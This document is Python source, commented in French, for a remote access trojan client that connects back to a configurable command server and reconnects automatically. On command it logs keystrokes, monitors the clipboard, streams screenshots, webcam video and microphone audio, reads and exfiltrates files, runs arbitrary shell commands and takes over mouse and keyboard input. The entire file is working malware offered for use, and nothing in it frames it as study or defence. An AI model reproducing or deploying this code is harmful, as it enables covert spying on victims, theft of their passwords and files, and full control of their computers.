# -*- coding: utf-8 -*-
import socket
import json
import threading
import time
import psutil
import platform
import pyautogui
from PIL import Image
import io
import base64
from cryptography.fernet import Fernet
import os
import shutil
from pathlib import Path
import mimetypes
from pynput import keyboard
import pyperclip
import subprocess
import sys
import mss
import mss.tools
import select
import struct
import fcntl
from PIL import ImageGrab
from datetime import datetime
from queue import Queue
import cv2
import pyaudio
import wave
import argparse

# Imports spécifiques à Linux
if platform.system() != 'Windows':
    import pty
    import termios

class RatClient:
    def __init__(self, server_host='127.0.0.1', server_port=8081):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.connected = False
        self.screen_capture_thread = None
        self.shell_thread = None
        self.keylogger_thread = None
        self.clipboard_thread = None
        self.screen_capture_running = False
        self.shell_running = False
        self.keylogger_running = False
        self.clipboard_running = False
        self.screenshot_interval = 100  # ms
        self.last_clipboard = ""
        self.keyboard_listener = None
        
        # Initialiser le chemin selon l'OS
        self.os_type = platform.system()
        if self.os_type == 'Windows':
            # Pour Windows, utiliser le chemin de l'utilisateur actuel
            self.current_path = os.path.expanduser("~")
            # Obtenir le nom d'utilisateur pour le chemin
            self.username = os.getlogin()
            print(f"[DEBUG] Windows détecté - Utilisateur: {self.username}")
            print(f"[DEBUG] Chemin initial: {self.current_path}")
        else:
            # Pour Linux/Unix
            self.current_path = os.path.expanduser("~")
            print(f"[DEBUG] Unix/Linux détecté - Chemin: {self.current_path}")
        
        self.screen_capture_active = False
        self.screen_capture_interval = 1000  # 1 seconde par défaut
        self.shell_process = None
        self.system_info_thread = None
        self.shell_queue = Queue()
        self.camera_running = False
        self.camera = None
        self.camera_thread = None
        self.camera_interval = 100  # Intervalle par défaut de 100ms
        self.audio_capture_running = False
        self.audio_thread = None
        self.audio_chunk = 1024
        self.audio_format = pyaudio.paInt16
        self.audio_channels = 1
        self.audio_rate = 44100
        self.audio = pyaudio.PyAudio()
        self.mouse_tracking_running = False
        self.mouse_tracking_thread = None
        self.mouse_tracking_interval = 100  # ms

    def connect(self):
        """Établit la connexion avec le serveur."""
        try:
            print(f"Tentative de connexion à {self.server_host}:{self.server_port}...")
            
            # Créer le socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Enlever le timeout pour une connexion permanente
            self.socket.settimeout(None)
            
            # Désactiver le Nagle's algorithm pour Windows
            if platform.system() == 'Windows':
                self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            print("Socket créé, tentative de connexion...")
            self.socket.connect((self.server_host, self.server_port))
            print("Connexion établie avec succès!")
            
            self.connected = True
            
            # Démarrer le thread de réception
            self.receive_thread = threading.Thread(target=self.receive_loop)
            self.receive_thread.daemon = True
            self.receive_thread.start()
            print("Thread de réception démarré")
            
            # Envoyer les informations système
            self.send_system_info()
            print("Informations système envoyées")
            
            return True
            
        except socket.timeout:
            print("Délai d'attente dépassé lors de la connexion")
            return False
        except ConnectionRefusedError:
            print("Connexion refusée. Vérifiez que le serveur est en cours d'exécution")
            return False
        except socket.gaierror as e:
            print(f"Erreur de résolution d'adresse : {e}")
            return False
        except Exception as e:
            print(f"Erreur de connexion : {e}")
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass
            return False

    def start_system_info_thread(self):
        """Démarre un thread pour envoyer les informations système."""
        self.system_info_thread = threading.Thread(target=self.send_system_info_loop)
        self.system_info_thread.daemon = True
        self.system_info_thread.start()

    def send_system_info_loop(self):
        """Envoie périodiquement les informations système au serveur."""
        while self.connected:
            try:
                # Récupérer les informations système
                cpu_percent = psutil.cpu_percent(interval=1)
                memory = psutil.virtual_memory()
                memory_percent = memory.percent
                
                # Préparer les données
                system_info = {
                    'type': 'system_info',
                    'data': {
                        'hostname': socket.gethostname(),
                        'os': platform.system() + " " + platform.release(),
                        'cpu': cpu_percent,
                        'memory': memory_percent
                    }
                }
                
                # Envoyer les données
                self.send_message(system_info)
                
                # Attendre avant la prochaine mise à jour
                time.sleep(1)
                
            except Exception as e:
                print(f"Erreur lors de l'envoi des informations système : {e}")
                time.sleep(5)  # Attendre avant de réessayer en cas d'erreur

    def receive_loop(self):
        """Boucle de réception des messages du serveur."""
        while self.connected:
            try:
                # Pas de timeout pour la réception
                size_bytes = self.socket.recv(8)
                if not size_bytes:
                    print("Connexion fermée par le serveur")
                    break
                    
                size = int.from_bytes(size_bytes, byteorder='big')
                data = b""
                
                # Lire les données par morceaux
                while len(data) < size:
                    try:
                        chunk = self.socket.recv(min(4096, size - len(data)))
                        if not chunk:
                            print("Connexion fermée pendant la réception des données")
                            break
                        data += chunk
                    except Exception as e:
                        print(f"Erreur lors de la réception des données : {e}")
                        break
                
                if not data or len(data) < size:
                    print("Données incomplètes reçues")
                    break
                    
                try:
                    # First try to decode as UTF-8 for text messages
                    message = json.loads(data.decode('utf-8'))
                except UnicodeDecodeError:
                    # If UTF-8 fails, it's likely binary data - send as base64
                    message = {
                        'type': 'binary_data',
                        'data': base64.b64encode(data).decode('utf-8')
                    }
                except json.JSONDecodeError as e:
                    print(f"Erreur de décodage JSON : {e}")
                    continue
                    
                self.handle_command(message)
                
            except Exception as e:
                print(f"Erreur de réception : {e}")
                break
        
        self.connected = False
        print("Déconnecté du serveur")
        
        # Tentative de reconnexion automatique
        while not self.connected:
            print("Tentative de reconnexion dans 5 secondes...")
            time.sleep(5)
            if self.connect():
                print("Reconnexion réussie!")
            else:
                print("Échec de la reconnexion")

    def send_message(self, message):
        """Envoie un message au serveur."""
        try:
            # Convertir le message en JSON
            data = json.dumps(message).encode('utf-8')
            
            # Envoyer la taille du message (8 bytes)
            size = len(data)
            self.socket.sendall(size.to_bytes(8, byteorder='big'))
            
            # Envoyer le message
            self.socket.sendall(data)
            
        except Exception as e:
            print(f"Erreur lors de l'envoi du message : {e}")
            self.connected = False

    def send_system_info(self):
        """Envoie les informations système au serveur."""
        info = {
            'hostname': platform.node(),
            'os': f"{platform.system()} {platform.release()}",
            'cpu': psutil.cpu_percent(),
            'memory': psutil.virtual_memory().percent
        }
        self.send_message({
            'type': 'system_info',
            'data': info
        })

    def handle_command(self, command):
        """Gère les commandes reçues du serveur."""
        try:
            cmd = command.get('command')
            data = command.get('data', {})
            
            print(f"Received command: {cmd}")
            
            if cmd == 'list_processes':
                self.list_processes()
            elif cmd == 'kill_process':
                self.kill_process(data.get('pid'))
            elif cmd == 'start_process':
                self.start_process(data.get('cmd'))
            elif cmd == 'list_directory':
                self.list_directory(data.get('path'))
            elif cmd == 'read_file':
                self.read_file(data.get('path'))
            elif cmd == 'write_file':
                self.write_file(data.get('path'), data.get('content'))
            elif cmd == 'rename_file':
                self.rename_file(data.get('old_path'), data.get('new_path'))
            elif cmd == 'download_file':
                self.download_file(data.get('path'))
            elif cmd == 'upload_file':
                self.upload_file(data.get('path'), data.get('file_name'), data.get('data'))
            elif cmd == 'create_directory':
                self.create_directory(data.get('path'))
            elif cmd == 'start_keylogger':
                self.start_keylogger()
            elif cmd == 'stop_keylogger':
                self.stop_keylogger()
            elif cmd == 'start_clipboard_monitor':
                self.start_clipboard_monitor()
            elif cmd == 'stop_clipboard_monitor':
                self.stop_clipboard_monitor()
            elif cmd == 'start_screen_capture':
                self.start_screen_capture(data.get('interval', 100))
            elif cmd == 'stop_screen_capture':
                self.stop_screen_capture()
            elif cmd == 'shell_command':
                self.execute_shell_command(data.get('cmd'))
            elif cmd == 'start_camera':
                self.start_camera(data.get('interval', 100))
            elif cmd == 'stop_camera':
                self.stop_camera()
            elif cmd == 'start_audio_capture':
                self.start_audio_capture()
            elif cmd == 'stop_audio_capture':
                self.stop_audio_capture()
            elif cmd == 'mouse_click':
                self.handle_mouse_click(data)
            elif cmd == 'mouse_move':
                self.handle_mouse_move(data)
            elif cmd == 'mouse_move_relative':
                self.handle_mouse_move_relative(data)
            elif cmd == 'start_mouse_tracking':
                self.start_mouse_tracking(data.get('interval', 100))
            elif cmd == 'stop_mouse_tracking':
                self.stop_mouse_tracking()
            elif cmd == 'keyboard_text':
                self.handle_keyboard_text(data['text'])
            elif cmd == 'special_key':
                self.handle_special_key(data['key'])
                
        except Exception as e:
            print(f"Error handling command: {e}")
            self.send_message({
                'type': 'command_response',
                'command': 'error',
                'data': {'message': str(e)}
            })

    def list_processes(self):
        """Liste les processus en cours."""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
                try:
                    pinfo = proc.info
                    # Adapter le nom du processus selon le système d'exploitation
                    if platform.system() == 'Windows':
                        name = pinfo['name']
                    else:
                        name = pinfo['name'] or 'Unknown'
                    
                    processes.append({
                        'pid': pinfo['pid'],
                        'name': name,
                        'cpu': pinfo['cpu_percent'] or 0.0,
                        'memory': pinfo['memory_percent'] or 0.0,
                        'status': pinfo['status']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
            self.send_message({
                'type': 'command_response',
                'command': 'list_processes',
                'data': processes
            })
        except Exception as e:
            print(f"Erreur lors de la liste des processus : {e}")

    def kill_process(self, pid):
        """Tue un processus."""
        try:
            process = psutil.Process(pid)
            if platform.system() == 'Windows':
                # Sous Windows, utiliser terminate() au lieu de kill()
                process.terminate()
            else:
                # Sous Linux, utiliser kill()
                process.kill()
            # Envoyer la liste mise à jour
            self.list_processes()
        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
            print(f"Erreur lors de la suppression du processus {pid}: {e}")

    def start_process(self, cmd):
        """Démarre un nouveau processus."""
        try:
            if platform.system() == 'Windows':
                # Sous Windows, utiliser CREATE_NEW_CONSOLE pour une meilleure visibilité
                subprocess.Popen(
                    cmd,
                    shell=True,
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
            else:
                # Sous Linux, utiliser le shell par défaut
                subprocess.Popen(cmd, shell=True)
            
            # Attendre un peu que le processus démarre
            time.sleep(0.5)
            # Envoyer la liste mise à jour
            self.list_processes()
        except Exception as e:
            print(f"Erreur lors du démarrage du processus : {e}")

    def list_directory(self, path):
        """Liste le contenu d'un répertoire."""
        try:
            # Si le chemin est vide ou None, utiliser le chemin actuel
            if not path:
                path = self.current_path
            
            print(f"[DEBUG] Tentative de listage du répertoire: {path}")
            
            # Pour Windows, s'assurer que le chemin est valide
            if self.os_type == 'Windows':
                # Si le chemin commence par C:\home\slayz, le corriger
                if path.startswith('C:\\home\\slayz'):
                    path = f"C:\\Users\\{self.username}"
                # Convertir les slashes en backslashes
                path = path.replace('/', '\\')
                # S'assurer que c'est un chemin absolu
                if not os.path.isabs(path):
                    path = os.path.join(f"C:\\Users\\{self.username}", path)
            
            # Convertir en chemin absolu
            path = os.path.abspath(path)
            print(f"[DEBUG] Chemin absolu final: {path}")
            
            # Vérifier si le chemin existe
            if not os.path.exists(path):
                print(f"[DEBUG] Le chemin {path} n'existe pas")
                self.send_message({
                    'type': 'command_response',
                    'command': 'list_directory',
                    'data': {
                        'error': f"Le chemin {path} n'existe pas",
                        'current_path': self.current_path,
                        'entries': []
                    }
                })
                return
            
            # Mettre à jour le chemin actuel si le nouveau chemin est valide
            self.current_path = path
            print(f"[DEBUG] Chemin actuel mis à jour: {self.current_path}")
            
            entries = []
            try:
                # Lister les fichiers et dossiers
                for item in os.listdir(path):
                    try:
                        full_path = os.path.join(path, item)
                        stat_info = os.stat(full_path)
                        
                        # Déterminer le type
                        if os.path.isdir(full_path):
                            item_type = "Directory"
                        else:
                            item_type = "File"
                        
                        # Formater la taille
                        size = stat_info.st_size
                        if size < 1024:
                            size_str = f"{size} B"
                        elif size < 1024*1024:
                            size_str = f"{size/1024:.1f} KB"
                        else:
                            size_str = f"{size/(1024*1024):.1f} MB"
                        
                        entry = {
                            'name': item,
                            'type': item_type,
                            'size': size_str,
                            'modified': datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                            'path': full_path
                        }
                        entries.append(entry)
                        print(f"[DEBUG] Ajouté: {item} ({item_type})")
                    except Exception as e:
                        print(f"[DEBUG] Erreur pour {item}: {str(e)}")
                        continue
            except Exception as e:
                print(f"[DEBUG] Erreur lors du listage: {str(e)}")
            
            # Trier les entrées (dossiers d'abord, puis par nom)
            entries.sort(key=lambda x: (x['type'] != 'Directory', x['name'].lower()))
            
            print(f"[DEBUG] Nombre total d'entrées: {len(entries)}")
            
            # Envoyer la réponse avec les entrées dans un dictionnaire
            response = {
                'type': 'command_response',
                'command': 'list_directory',
                'data': {
                    'entries': entries,
                    'current_path': path
                }
            }
            print(f"[DEBUG] Envoi de la réponse avec {len(entries)} entrées")
            print(f"[DEBUG] Format de la réponse: {response}")
            self.send_message(response)
            
        except Exception as e:
            print(f"[DEBUG] Erreur globale: {str(e)}")
            self.send_message({
                'type': 'command_response',
                'command': 'list_directory',
                'data': {
                    'error': str(e),
                    'current_path': self.current_path,
                    'entries': []
                }
            })

    def create_directory(self, path):
        """Crée un nouveau répertoire."""
        try:
            os.makedirs(path)
        except Exception as e:
            print(f"Erreur lors de la création du répertoire : {e}")

    def upload_file(self, path, file_name, data):
        """Upload un fichier."""
        try:
            # Assurer que le chemin est correct pour le système d'exploitation
            file_path = os.path.join(path, file_name)
            with open(file_path, 'wb') as f:
                f.write(base64.b64decode(data))
            self.send_message({
                'type': 'command_response',
                'command': 'file_uploaded',
                'data': {'file_name': file_name}
            })
        except Exception as e:
            print(f"Erreur lors de l'upload du fichier : {e}")
            self.send_message({
                'type': 'command_response',
                'command': 'file_uploaded',
                'data': {'file_name': file_name, 'status': 'error', 'message': str(e)}
            })

    def download_file(self, path):
        """Télécharge un fichier."""
        try:
            with open(path, 'rb') as f:
                data = f.read()
                self.send_message({
                    'type': 'file_data',
                    'data': base64.b64encode(data).decode()
                })
        except Exception as e:
            print(f"Erreur lors du téléchargement du fichier : {e}")

    def read_file(self, path):
        """Lit le contenu d'un fichier."""
        try:
            with open(path, 'rb') as f:
                content = f.read()
                encoded_content = base64.b64encode(content).decode('utf-8')
                self.send_message({
                    'type': 'command_response',
                    'command': 'read_file',
                    'data': encoded_content
                })
        except Exception as e:
            print(f"Erreur lors de la lecture du fichier {path}: {e}")
            self.send_message({
                'type': 'command_response',
                'command': 'read_file',
                'data': ''
            })

    def write_file(self, path, content):
        """Écrit le contenu dans un fichier."""
        try:
            with open(path, 'wb') as f:
                decoded_content = base64.b64decode(content)
                f.write(decoded_content)
            self.send_message({
                'type': 'command_response',
                'command': 'write_file',
                'data': {'status': 'success'}
            })
        except Exception as e:
            print(f"Erreur lors de l'écriture du fichier {path}: {e}")
            self.send_message({
                'type': 'command_response',
                'command': 'write_file',
                'data': {'status': 'error', 'message': str(e)}
            })

    def rename_file(self, old_path, new_path):
        """Renomme un fichier ou un dossier."""
        try:
            os.rename(old_path, new_path)
            self.send_message({
                'type': 'command_response',
                'command': 'rename_file',
                'data': {'status': 'success'}
            })
        except Exception as e:
            print(f"Erreur lors du renommage de {old_path} vers {new_path}: {e}")
            self.send_message({
                'type': 'command_response',
                'command': 'rename_file',
                'data': {'status': 'error', 'message': str(e)}
            })

    def start_keylogger(self):
        """Démarre le keylogger."""
        if not self.keylogger_running:
            self.keylogger_running = True
            self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
            self.keyboard_listener.start()

    def stop_keylogger(self):
        """Arrête le keylogger."""
        if self.keylogger_running:
            self.keylogger_running = False
            if self.keyboard_listener:
                self.keyboard_listener.stop()

    def on_key_press(self, key):
        """Gère les événements de touche."""
        if not self.keylogger_running:
            return
            
        try:
            if hasattr(key, 'char'):
                key_str = key.char
            else:
                key_str = str(key)
                
            self.send_message({
                'type': 'command_response',
                'command': 'keylog',
                'data': key_str
            })
        except Exception:
            pass

    def start_clipboard_monitor(self):
        """Démarre le moniteur de presse-papiers."""
        if not self.clipboard_running:
            self.clipboard_running = True
            self.clipboard_thread = threading.Thread(target=self.clipboard_monitor_loop)
            self.clipboard_thread.daemon = True
            self.clipboard_thread.start()

    def stop_clipboard_monitor(self):
        """Arrête le moniteur de presse-papiers."""
        self.clipboard_running = False

    def clipboard_monitor_loop(self):
        """Boucle de surveillance du presse-papiers."""
        while self.clipboard_running:
            try:
                current = pyperclip.paste()
                if current != self.last_clipboard:
                    self.last_clipboard = current
                    self.send_message({
                        'type': 'command_response',
                        'command': 'clipboard',
                        'data': current
                    })
                time.sleep(0.1)
            except Exception:
                pass

    def start_screen_capture(self, interval):
        """Démarre la capture d'écran."""
        if not self.screen_capture_running:
            self.screenshot_interval = interval
            self.screen_capture_running = True
            self.screen_capture_thread = threading.Thread(target=self.screen_capture_loop)
            self.screen_capture_thread.daemon = True
            self.screen_capture_thread.start()

    def stop_screen_capture(self):
        """Arrête la capture d'écran."""
        self.screen_capture_running = False

    def screen_capture_loop(self):
        """Boucle de capture d'écran."""
        while self.screen_capture_running:
            try:
                screenshot = ImageGrab.grab()
                buffer = io.BytesIO()
                screenshot.save(buffer, format='JPEG', quality=50)
                self.send_message({
                    'type': 'command_response',
                    'command': 'screenshot',
                    'data': base64.b64encode(buffer.getvalue()).decode()
                })
                time.sleep(self.screenshot_interval / 1000)
            except Exception as e:
                print(f"Erreur lors de la capture d'écran : {e}")

    def start_shell(self):
        """Démarre le shell distant."""
        if not self.shell_running:
            self.shell_running = True
            self.shell_thread = threading.Thread(target=self.shell_loop)
            self.shell_thread.daemon = True
            self.shell_thread.start()

    def stop_shell(self):
        """Arrête le shell distant."""
        self.shell_running = False
        self.shell_queue.put(None)

    def shell_loop(self):
        """Boucle du shell distant."""
        try:
            if platform.system() == 'Windows':
                # Sous Windows, utiliser subprocess directement
                process = subprocess.Popen(
                    ['cmd.exe'],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True,
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                
                while self.shell_running:
                    try:
                        # Lire la sortie
                        output = process.stdout.readline()
                        if output:
                            self.send_message({
                                'type': 'command_response',
                                'command': 'shell_output',
                                'data': output
                            })
                    except Exception as e:
                        print(f"Erreur de lecture du shell Windows: {e}")
                        break
            else:
                # Sous Linux, utiliser pty et termios
                master, slave = pty.openpty()
                
                # Configurer le terminal
                old_settings = termios.tcgetattr(slave)
                new_settings = termios.tcgetattr(slave)
                new_settings[3] = new_settings[3] & ~termios.ECHO
                termios.tcsetattr(slave, termios.TCSANOW, new_settings)
                
                # Démarrer le shell
                shell = subprocess.Popen(
                    ['/bin/bash'],
                    stdin=slave,
                    stdout=slave,
                    stderr=slave,
                    universal_newlines=True
                )
                
                # Boucle de lecture/écriture
                while self.shell_running:
                    r, w, e = select.select([master], [], [], 0.1)
                    if master in r:
                        try:
                            data = os.read(master, 1024).decode()
                            if data:
                                self.send_message({
                                    'type': 'command_response',
                                    'command': 'shell_output',
                                    'data': data
                                })
                        except Exception:
                            break
                
                # Nettoyage Linux
                termios.tcsetattr(slave, termios.TCSANOW, old_settings)
                os.close(master)
                os.close(slave)
            
            # Nettoyage commun
            if 'process' in locals():
                process.terminate()
            if 'shell' in locals():
                shell.terminate()
            
        except Exception as e:
            print(f"Erreur du shell : {e}")

    def start_camera(self, interval=100):
        """Démarre la capture de la caméra."""
        try:
            self.camera = cv2.VideoCapture(0)  # 0 pour la caméra par défaut
            if not self.camera.isOpened():
                raise Exception("Impossible d'ouvrir la caméra")
                
            self.camera_running = True
            self.camera_interval = interval
            
            # Démarrer le thread de capture
            self.camera_thread = threading.Thread(target=self.camera_capture_loop)
            self.camera_thread.daemon = True
            self.camera_thread.start()
            
            self.send_message({
                'type': 'command_response',
                'command': 'camera_started',
                'data': {'message': 'Camera started successfully'}
            })
            
        except Exception as e:
            print(f"Erreur lors du démarrage de la caméra: {e}")
            self.send_message({
                'type': 'command_response',
                'command': 'camera_started',
                'data': {'message': str(e)}
            })

    def stop_camera(self):
        """Arrête la capture de la caméra."""
        try:
            self.camera_running = False
            if self.camera:
                self.camera.release()
                self.camera = None
            if self.camera_thread:
                self.camera_thread.join(timeout=1)
                self.camera_thread = None
                
            self.send_message({
                'type': 'command_response',
                'command': 'camera_stopped',
                'data': {'message': 'Camera stopped successfully'}
            })
            
        except Exception as e:
            print(f"Erreur lors de l'arrêt de la caméra: {e}")
            self.send_message({
                'type': 'command_response',
                'command': 'camera_stopped',
                'data': {'message': str(e)}
            })

    def camera_capture_loop(self):
        """Boucle de capture de la caméra."""
        while self.camera_running:
            try:
                ret, frame = self.camera.read()
                if ret:
                    # Convertir l'image en JPEG
                    _, buffer = cv2.imencode('.jpg', frame)
                    # Convertir en base64
                    image_data = base64.b64encode(buffer).decode('utf-8')
                    # Envoyer l'image
                    self.send_message({
                        'type': 'command_response',
                        'command': 'camera',
                        'data': image_data
                    })
                else:
                    print("Échec de la capture de la caméra")
                    break
                    
                # Attendre l'intervalle spécifié
                time.sleep(self.camera_interval / 1000.0)  # Convertir en secondes
                
            except Exception as e:
                print(f"Erreur dans la boucle de capture: {e}")
                break

    def capture_photo(self):
        """Capture une photo avec la caméra."""
        try:
            if not self.camera:
                self.camera = cv2.VideoCapture(0)
                if not self.camera.isOpened():
                    raise Exception("Impossible d'ouvrir la caméra")
            
            ret, frame = self.camera.read()
            if ret:
                # Convertir l'image en JPEG
                _, buffer = cv2.imencode('.jpg', frame)
                # Convertir en base64
                image_data = base64.b64encode(buffer).decode('utf-8')
                # Envoyer la photo
                self.send_message({
                    'type': 'photo_captured',
                    'data': image_data
                })
            else:
                raise Exception("Échec de la capture de la photo")
                
        except Exception as e:
            print(f"Erreur lors de la capture de la photo: {e}")
            self.send_message({
                'type': 'command_response',
                'command': 'photo_captured',
                'data': {'message': str(e)}
            })
        finally:
            if self.camera and not self.camera_running:
                self.camera.release()
                self.camera = None

    def start_audio_capture(self):
        """Démarre la capture audio."""
        if not self.audio_capture_running:
            print("Initializing audio capture...")
            self.audio_capture_running = True
            self.audio_thread = threading.Thread(target=self.audio_capture_loop)
            self.audio_thread.daemon = True
            self.audio_thread.start()
            print("Audio capture started")
            return True
        print("Audio capture already running")
        return False

    def stop_audio_capture(self):
        """Arrête la capture audio."""
        print("Stopping audio capture...")
        self.audio_capture_running = False
        if self.audio_thread:
            self.audio_thread.join()
        print("Audio capture stopped")
        return True

    def audio_capture_loop(self):
        """Boucle de capture audio."""
        try:
            print("Opening audio stream...")
            stream = self.audio.open(
                format=self.audio_format,
                channels=self.audio_channels,
                rate=self.audio_rate,
                input=True,
                frames_per_buffer=self.audio_chunk
            )
            print("Audio stream opened successfully")
            
            while self.audio_capture_running:
                try:
                    data = stream.read(self.audio_chunk)
                    print(f"Sending audio data: {len(data)} bytes")
                    self.send_message({
                        'type': 'command_response',
                        'command': 'audio',
                        'data': base64.b64encode(data).decode()
                    })
                except Exception as e:
                    print(f"Error during audio capture: {e}")
                    break
            
            print("Closing audio stream...")
            stream.stop_stream()
            stream.close()
            print("Audio stream closed")
        except Exception as e:
            print(f"Error initializing audio capture: {e}")

    def handle_mouse_click(self, data):
        """Gère les commandes de clic de souris."""
        try:
            button = data.get('button', 'left')
            action = data.get('action', 'click')
            
            if action == 'click':
                if button == 'left':
                    pyautogui.click()
                elif button == 'right':
                    pyautogui.rightClick()
                elif button == 'double':
                    pyautogui.doubleClick()
            elif action == 'press':
                if button == 'left':
                    pyautogui.mouseDown()
                elif button == 'right':
                    pyautogui.mouseDown(button='right')
            elif action == 'release':
                if button == 'left':
                    pyautogui.mouseUp()
                elif button == 'right':
                    pyautogui.mouseUp(button='right')
        except Exception as e:
            print(f"Erreur lors du clic de souris : {e}")
            
    def handle_mouse_move(self, data):
        """Gère les commandes de déplacement de souris."""
        try:
            x = data.get('x', 0)
            y = data.get('y', 0)
            
            # Convertir les coordonnées relatives en coordonnées absolues
            screen_width, screen_height = pyautogui.size()
            absolute_x = int(x * screen_width)
            absolute_y = int(y * screen_height)
            
            pyautogui.moveTo(absolute_x, absolute_y)
            # Envoyer la nouvelle position
            self.send_mouse_position()
        except Exception as e:
            print(f"Erreur lors du déplacement de la souris : {e}")
            
    def handle_mouse_move_relative(self, data):
        """Gère les commandes de déplacement relatif de souris."""
        try:
            dx = data.get('dx', 0)
            dy = data.get('dy', 0)
            
            pyautogui.moveRel(dx, dy)
        except Exception as e:
            print(f"Erreur lors du déplacement relatif de la souris : {e}")

    def send_mouse_position(self):
        """Envoie la position actuelle de la souris."""
        try:
            x, y = pyautogui.position()
            screen_width, screen_height = pyautogui.size()
            relative_x = x / screen_width
            relative_y = y / screen_height
            
            self.send_message({
                'type': 'command_response',
                'command': 'mouse_position',
                'data': {
                    'x': relative_x,
                    'y': relative_y,
                    'absolute_x': x,
                    'absolute_y': y
                }
            })
        except Exception as e:
            print(f"Erreur lors de l'envoi de la position de la souris : {e}")

    def start_mouse_tracking(self, interval=100):
        """Démarre le suivi automatique de la souris."""
        if not self.mouse_tracking_running:
            self.mouse_tracking_running = True
            self.mouse_tracking_interval = interval
            self.mouse_tracking_thread = threading.Thread(target=self.mouse_tracking_loop)
            self.mouse_tracking_thread.daemon = True
            self.mouse_tracking_thread.start()
            self.send_message({
                'type': 'command_response',
                'command': 'mouse_tracking_started',
                'data': {'message': 'Mouse tracking started successfully'}
            })

    def stop_mouse_tracking(self):
        """Arrête le suivi automatique de la souris."""
        self.mouse_tracking_running = False
        if self.mouse_tracking_thread:
            self.mouse_tracking_thread.join(timeout=1)
            self.mouse_tracking_thread = None
        self.send_message({
            'type': 'command_response',
            'command': 'mouse_tracking_stopped',
            'data': {'message': 'Mouse tracking stopped successfully'}
        })

    def mouse_tracking_loop(self):
        """Boucle de suivi de la souris."""
        last_position = None
        while self.mouse_tracking_running:
            try:
                current_x, current_y = pyautogui.position()
                current_position = (current_x, current_y)
                
                # Envoyer la position uniquement si elle a changé
                if current_position != last_position:
                    self.send_mouse_position()
                    last_position = current_position
                
                time.sleep(self.mouse_tracking_interval / 1000.0)
            except Exception as e:
                print(f"Erreur lors du suivi de la souris : {e}")
                break

    def execute_shell_command(self, cmd):
        """Exécute une commande shell."""
        try:
            if platform.system() == 'Windows':
                # Sous Windows, utiliser cmd.exe
                process = subprocess.Popen(
                    ['cmd.exe', '/c', cmd],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True,
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
            else:
                # Sous Linux, utiliser bash
                process = subprocess.Popen(
                    ['/bin/bash', '-c', cmd],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True
                )
            
            stdout, stderr = process.communicate()
            output = stdout if stdout else stderr
            self.send_message({
                'type': 'command_response',
                'command': 'shell_output',
                'data': output
            })
        except Exception as e:
            print(f"Erreur lors de l'exécution de la commande shell : {e}")
            self.send_message({
                'type': 'command_response',
                'command': 'shell_output',
                'data': f"Erreur : {str(e)}"
            })

def main():
    # Créer le parser d'arguments
    parser = argparse.ArgumentParser(description='Client RAT')
    parser.add_argument('--host', type=str, default='127.0.0.1', help='Adresse IP du serveur')
    parser.add_argument('--port', type=int, default=8081, help='Port du serveur')
    
    # Parser les arguments
    args = parser.parse_args()
    
    # Créer et démarrer le client avec les arguments
    client = RatClient(server_host=args.host, server_port=args.port)
    try:
        print(f"Tentative de connexion à {args.host}:{args.port}...")
        if client.connect():
            print("Connecté avec succès!")
            while client.connected:
                time.sleep(1)
        else:
            print("Échec de la connexion")
    except KeyboardInterrupt:
        print("\nArrêt du client...")
    finally:
        if client.socket:
            client.socket.close()

if __name__ == '__main__':
    main()
        